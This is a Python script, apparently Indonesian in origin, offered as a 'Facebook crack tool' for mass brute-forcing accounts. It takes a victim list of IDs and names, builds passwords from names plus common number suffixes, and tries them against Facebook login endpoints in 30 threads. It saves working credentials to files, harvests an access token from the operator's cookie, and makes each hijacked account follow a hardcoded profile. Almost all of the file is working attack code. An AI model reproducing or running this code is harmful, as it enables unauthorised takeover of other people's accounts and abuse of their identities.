#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6

### Import Module
import os
try:
    import requests
except ImportError:
    print('\n Module requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n Module futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n Module bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid
from concurrent.futures import ThreadPoolExecutor as BilalBSN
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  CHIGOZIEWORLDWIDE.  #
#------------------------------->

############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
###########################################################################################
done = False
def animate():
    os.system("clear")
    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
        if done:
            break
        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)
        sys.stdout.flush()
        time.sleep(0.03)
t = threading.Thread(target=animate)
t.start()
time.sleep(0.5)
done = True

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

# LO KONTOL
def logo():
	print("""%s
═══════════════════════════════════════
 WELCOME TO FACEBOOK THE CHANGCUTERS CRACK TOOL                    
═══════════════════════════════════════
───  • MASTER MULTI BRUTE FORCE •  ──
│ ╭────────────────────────── │
\33[1;31m, ＜￣｀ヽ、　　　　　　／￣＞
\33[1;32m　ゝ、　　＼　／⌒ヽ,ノ 　/´
\33[1;33m　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
\33[1;34m　　 　　> MR,VEAR ,)
　\33[1;35m　　　　∠_,,,/
 MR,VEAR
│ ╰────────────────────────── │
╰─────────────────────
 ───  • l  Don't play with me l •  ─‌─
│ ╭─────────────────── │
    │ [S] STATUS PREMIUM                                                               
    │ [W] NAME TOOL : MR,VEAR     
    │ [V] VERSION : 0,1                                        
│ ╰─────────────────── │
 ─────────────────────
"""%(O))

def reg():
    os.system('clear')
    logo()
    print ('')
    print ('  MENDAFTAR PERSETUJUAN')
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.bs7nt.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://github.com/Tremux-Suman/approval.txt/blob/main/approval.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        os.system('clear')
        logo()
        print('')
        print ('  DISETUJUI TIDAK TERDETEKSI')
        print ('')
        print ('  \033[1;97mTOKEN: ' + to)
        input('\033[1;97m  TEKAN ENTER UNTUK MENGIRIM TOKEN BANGSAT')
        print(' VISI MISI FOYA FOYA THE CHANGCUTERS ')
        os.system('xdg-open https://www.facebook.com/vear.ahmad.545?mibextid=ZbWKwL :'+to)
        reg()

def reg2():
    os.system('clear')
    logo()
    print('')
    print ('tDISETUJUI TIDAK TERDETEKSI')
    print('')
    id = uuid.uuid4().hex[:50]
    print (' TOKEN : ' + id)
    print(' facebook : 100024289210592')
    input(' Press Enter To Send Token ')
    os.system('xdg-open https://www.facebook.com/vear.ahmad.545?mibextid=ZbWKwL :'+id)
    sav = open('/sdcard/Android/.bs7nt.txt', 'w')
    sav.write(id)
    sav.close()
    reg()



#MASUK TOKEN
def chigozie():
    os.system('clear')
    print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
    cookie = input("\n %s[%s?%s] Cookies : %s"% (O,O,O,O))
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+2348069472717');chigozie()
    try:
        head={
     "path": '/',
     "scheme": 'https',
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2102J20SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
        asww=requests.get("https://business.facebook.com/creatorstudio/home", headers=head)
        reqq=re.search('{"accessToken":"(EAA\w+)', asww.text)
        tokn=reqq.group(1)
        open('.cokie.txt', 'a').write(cookie)
        open('.token.txt', 'a').write(tokn)
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokn)).json()['name']
        print('\n\n %s*%s selamat datang %s%s%s'%(O,O,O,nama,O));time.sleep(2)
        print(' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,O));time.sleep(2)
        input(' %s*%s tekan enter '%(O,O))
        os.system('xdg-open https://wa.me/+2348069472717')
        bsn_menu()
    except AttributeError:
        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
    except UnboundLocalError:
        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(O,O,O))
### ORANG GANTENG ###
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print('\n----------------------------------------------')
        print(' Your Process Complete...')
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mMR,VEAR OK : %s --- \033[1;97mAdf-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mMR,VEAR CP : %s --- \033[1;97mAdf-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
        input(f"\n\033[1;97m Press Enter To Go Back ")
        bsn_menu()

def bsn_menu():
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json() 
    IP = ipm["origin"]
    #print(" [*]. CREATED BY |:-( A D F )");time.sleep (0.03)
    #print(" [*]. Tysm To My All Frendz. (Waqar BILAL)");time.sleep (0.03)
    #print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    #print(" [*]. VERSION  1.0                                    ");time.sleep (0.03)   
    #print(" [*]. WP             +923491383368       ");time.sleep (0.03)
    #print(" [*]. This Tool was made in Pakistan                 ");time.sleep (0.03)
    #print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
   # print(".[*] ---------------------------------------------");time.sleep(0.03)
    #print(" [*] A N O N Y M O U S  D A R K F A T E  ( A D F )    ");time.sleep (0.03)
    #print(".[*] ---------------------------------------------");time.sleep(0.03)
    #print(".[*] This is a Premium Tool Bro                                 ");time.sleep (0.03)
    #print(".[*] You neeed to buy this tool for 1 month membership                       ");time.sleep (0.03) 
    #print(" [*] ---------------------------------------------");time.sleep(0.03)
    #print(" [*] IP ADDRESS        [%s]\n"%(IP));time.sleep(0.01)
    #print("   \033[1;97m              Menu")
    #print("-----------------=\<------------------")
    #print(" [1] File Cloning")
    #print(" [2] Follow Owner")
    #print(" [0] Exit")
    #print("")
    pepek = input(' Select : ')
    if pepek in['1','01']:
        __bsn__().bilo(id)
            

class __bsn__:

    def __init__(self):
        self.id = []

    def bilo(self,id):
        os.system('clear')
        logo()
        print("              file crack menu")
        print(' -------------------------------------------')
        print('')
        self.cnt = input('%s [+] file name :%s '%(P,K))
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        logo()
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            os.system('clear')
            logo()
            print("              Method Menu")
            print('-------------------------------------------')
            print('')
            print(' [+] Method 1')
            print(' [+] Method 2')
            print(' [+] Method 3 (Best)')
            self.__pler__()
        else:
            print(' Choose Correct One');self.bilo(id)

    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [MR,VEAR] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                print('\r [OK-MR,VEAR] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('MR,VEAR-ok.txt' , 'a').write('%s\n' % wrt)
                break
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r%s \033[1;91m[CP-MR,VEAR] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('MR,VEAR-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r%s \033[1;91m[CP-MR,VEAR] %s | %s ' % (K,user,pw))
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('MR,VEAR-cp.txt' , 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [MR,VEAR] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "path": '/',
                    "scheme": 'https',
                    'authority': 'mbasic.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'dpr': '2.75',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-model': '"M2102J20SG"',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"12.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    'viewport-width': '980',}
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "path": '/',
                    "scheme": 'https',
                    'authority': 'mbasic.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'dpr': '2.75',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-model': '"M2102J20SG"',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"12.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    'viewport-width': '980',}
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r{H} [OK-MR,VEAR] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MR,VEAR-ok.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[CP-MR,VEAR] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MR,VEAR-cp.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r%s \033[1;91m[CP-MR,VEAR] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('chang-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue

            loop+=1
        except:
            self.__metode__(user, pw, cebok)
#    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100065533669299",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text

    def __pler__(self):
        chi = ('3')
        if chi == '':
            print('\nSelect Correct One');self.__pler__()
        elif chi in ('1', '01'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+'12345678',xz[0]+'123456789',xz[0]+'1234567890',xz[0]+'11223344',xz[0]+'00',xz[0]+'0000',xz[0]+'4321',xz[0]+'555',xz[0]+'333',xz[0]+'999',xz[0]+'3000',xz[0]+'112',xz[0]+'222']
                        else:
                            pwx = [name, xz[0]+'12345678',xz[0]+'123456789',xz[0]+'1234567890',xz[0]+'11223344',xz[0]+'00',xz[0]+'0000',xz[0]+'4321',xz[0]+'555',xz[0]+'333',xz[0]+'999',xz[0]+'3000',xz[0]+'112',xz[0]+'222']
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456',xz[0]+'1234567',xz[0]+'12',xz[0]+'11',xz[0]+'111',xz[0]+'1122',xz[0]+'112233',xz[0]+'000',xz[0]+'2000',xz[0]+'1000']
                        else:
                            pwx = [name, xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456',xz[0]+'1234567',xz[0]+'12',xz[0]+'11',xz[0]+'111',xz[0]+'1122',xz[0]+'112233',xz[0]+'000',xz[0]+'2000',xz[0]+'1000']
                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        elif chi in ('3', '03'):

            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name,xz[0]+'1975',xz[0]+'1976',xz[0]+'1977',xz[0]+'1978',xz[0]+'1979',xz[0]+'1980',xz[0]+'1981',xz[0]+'1982',xz[0]+'1983',xz[0]+'1999',xz[0]+'1993',xz[0]+'2001',xz[0]+'2003']
                        else:
                            pwx = [name,xz[0]+'1975',xz[0]+'1976',xz[0]+'1977',xz[0]+'1978',xz[0]+'1979',xz[0]+'1980',xz[0]+'1981',xz[0]+'1982',xz[0]+'1983',xz[0]+'1999',xz[0]+'1993',xz[0]+'2001',xz[0]+'2003']
                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        else:
            print('\n Select Valid One');self.__pler__()


if __name__ == '__main__':
    chigozie()
